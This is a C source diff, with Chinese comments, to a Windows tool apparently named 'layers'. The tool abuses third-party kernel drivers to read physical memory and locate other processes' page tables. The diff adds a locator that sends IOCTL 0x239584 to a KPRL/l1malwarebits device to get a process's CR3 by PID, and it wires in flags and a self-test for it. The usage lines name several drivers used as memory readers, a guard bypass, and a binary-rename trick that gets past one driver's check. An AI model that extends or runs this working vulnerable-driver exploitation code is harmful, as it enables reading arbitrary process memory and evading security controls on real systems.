@@ -599,6 +599,42 @@ static int kkyum_locate_cr3(uint32_t pid, const char *device, uint64_t *out_cr3,
 }
 
 // ---------------------------------------------------------------------------
+// 定位层策略 4: KPRL l1malwarebits.sys - CR3 by PID (IOCTL 0x239584)
+// Input buffer: PID at offset 0; driver returns CR3 at offset 0x38;
+// information length 0x48. Device name is configured by the driver (may be
+// obfuscated at rest); caller can pass --kprl-device, otherwise common
+// candidates are tried.
+// ---------------------------------------------------------------------------
+static int kprl_build_query(uint32_t pid, uint8_t *buf, uint32_t size) {
+    if (!buf || size < 0x48) return 0;
+    memset(buf, 0, size);
+    *(uint32_t *)(buf + 0) = pid;
+    return 1;
+}
+
+static int kprl_locate_cr3(uint32_t pid, const char *device, uint64_t *out_cr3) {
+    const char *paths[] = { device, "\\\\.\\KPRL", "\\\\.\\kprl", "\\\\.\\l1malwarebits",
+                            "\\\\.\\GlobalRoot\\Device\\KPRL" };
+    HANDLE h = INVALID_HANDLE_VALUE;
+    for (int i = 0; i < (int)(sizeof(paths) / sizeof(paths[0])) && h == INVALID_HANDLE_VALUE; i++) {
+        if (!paths[i] || !paths[i][0]) continue;
+        h = CreateFileA(paths[i], GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                        NULL, OPEN_EXISTING, 0, NULL);
+    }
+    if (h == INVALID_HANDLE_VALUE) return 0;
+    uint8_t buf[0x48];
+    if (!kprl_build_query(pid, buf, sizeof(buf))) { CloseHandle(h); return 0; }
+    DWORD ret = 0;
+    BOOL ok = DeviceIoControl(h, 0x239584u, buf, sizeof(buf), buf, sizeof(buf), &ret, NULL);
+    CloseHandle(h);
+    if (!ok) return 0;
+    uint64_t cr3 = *(uint64_t *)(buf + 0x38);
+    if (!cr3 || cr3 >= MB_MAX_PHYS) return 0;
+    *out_cr3 = cr3;
+    return 1;
+}
+
+// ---------------------------------------------------------------------------
 // 定位层辅助：从注册表读取物理内存范围（HARDWARE\RESOURCEMAP\...\Physical Memory）
 // 这样物理扫描 locator 不需要用户手工提供范围，也不需要内核读驱动。
 // ---------------------------------------------------------------------------
@@ -820,6 +856,13 @@ static int selftest_mock(void) {
     }
     check("定位层(locator)", "kernel-reader list walk -> CR3=0x3000 (no physical reader)", ok_kloc);
 
+    // KPRL CR3-by-PID query request layout (offline, no driver)
+    uint8_t kprl_req[0x48];
+    int ok_kprl = kprl_build_query(4245, kprl_req, sizeof(kprl_req)) &&
+                  *(uint32_t *)(kprl_req + 0) == 4245 &&
+                  *(uint32_t *)(kprl_req + 4) == 0;
+    check("定位层(locator)", "kprl CR3 query request layout (pid at offset 0)", ok_kprl);
+
     // full pipeline: locate -> translate -> fetch
     uint64_t cr3b = 0;
     uint8_t pipe[64];
@@ -858,21 +901,23 @@ static void usage(void) {
     printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64> [--device <path>] --locate --pid <pid> --auto-ranges [--name <exe>]\n");
     printf("  layers --reader ... --locate --pid <pid> (--scan-start/--scan-size | --auto-ranges) --va <hex> --size <n>\n");
     printf("  layers --locate --kkyum --pid <pid> [--kkyum-device <path>]   (kernel-VA locator; no physical reader needed)\n");
+    printf("  layers --locate --kprl --pid <pid> [--kprl-device <path>]     (KPRL CR3-by-PID; no physical reader needed)\n");
     printf("  note: --reader cpuz requires --expect-first <dword> (target page first dword, guard bypass)\n");
     printf("  note: --reader asupio64 requires layers.exe to be named PEUPDATER.EXE (AsUpIO64 gate)\n");
 }
 
 int main(int argc, char **argv) {
-    const char *kind = NULL, *device = NULL, *name = NULL, *kkyum_device = NULL;
+    const char *kind = NULL, *device = NULL, *name = NULL, *kkyum_device = NULL, *kprl_device = NULL;
     uint64_t pa = 0, cr3 = 0, va = 0, scan_start = 0, scan_size = 0;
     uint32_t size = 0x40, pid = 0, expect_first = 0;
     int do_selftest = 0, do_read_phys = 0, do_explicit = 0, do_locate = 0, have_cr3 = 0, have_va = 0;
-    int do_ranges = 0, auto_ranges = 0, use_kkyum = 0;
+    int do_ranges = 0, auto_ranges = 0, use_kkyum = 0, use_kprl = 0;
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "--selftest-mock") == 0) do_selftest = 1;
         else if (strcmp(argv[i], "--reader") == 0 && i + 1 < argc) kind = argv[++i];
         else if (strcmp(argv[i], "--device") == 0 && i + 1 < argc) device = argv[++i];
         else if (strcmp(argv[i], "--kkyum-device") == 0 && i + 1 < argc) kkyum_device = argv[++i];
+        else if (strcmp(argv[i], "--kprl-device") == 0 && i + 1 < argc) kprl_device = argv[++i];
         else if (strcmp(argv[i], "--name") == 0 && i + 1 < argc) name = argv[++i];
         else if (strcmp(argv[i], "--expect-first") == 0 && i + 1 < argc) expect_first = (uint32_t)strtoul(argv[++i], NULL, 0);
         else if (strcmp(argv[i], "--pa") == 0 && i + 1 < argc) pa = _strtoui64(argv[++i], NULL, 0);
@@ -885,6 +930,7 @@ int main(int argc, char **argv) {
         else if (strcmp(argv[i], "--read-phys") == 0) do_read_phys = 1;
         else if (strcmp(argv[i], "--locate") == 0) do_locate = 1;
         else if (strcmp(argv[i], "--kkyum") == 0) use_kkyum = 1;
+        else if (strcmp(argv[i], "--kprl") == 0) use_kprl = 1;
         else if (strcmp(argv[i], "--ranges") == 0) do_ranges = 1;
         else if (strcmp(argv[i], "--auto-ranges") == 0) auto_ranges = 1;
         else if (strcmp(argv[i], "--explicit") == 0) do_explicit = 1;
@@ -904,7 +950,7 @@ int main(int argc, char **argv) {
         printf("VERDICT=PASS\n");
         return 0;
     }
-    if (!kind && !(use_kkyum && do_locate && !have_va)) { usage(); return 6; }
+    if (!kind && !((use_kkyum || use_kprl) && do_locate && !have_va)) { usage(); return 6; }
 
     mb_phys_reader r;
     int have_reader = 0;
@@ -930,7 +976,15 @@ int main(int argc, char **argv) {
         free(b);
     } else if (do_locate) {
         uint64_t got_cr3 = 0, eproc = 0;
-        if (use_kkyum && pid) {
+        if (use_kprl && pid) {
+            if (!kprl_locate_cr3(pid, kprl_device, &got_cr3)) {
+                printf("[ERR] 定位层 kprl failed (pid=%u): device/IOCTL 0x239584 error\n", pid);
+                rc = 5;
+            } else {
+                printf("[OK] 定位层 kprl: PID=%u CR3=0x%llX (KPRL l1malwarebits CR3-by-PID)\n",
+                       pid, (unsigned long long)got_cr3);
+            }
+        } else if (use_kkyum && pid) {
             if (!kkyum_locate_cr3(pid, kkyum_device, &got_cr3, &eproc)) {
                 printf("[ERR] 定位层 kkyum failed (pid=%u): device/ntoskrnl/EPROCESS walk error\n", pid);
                 rc = 5;
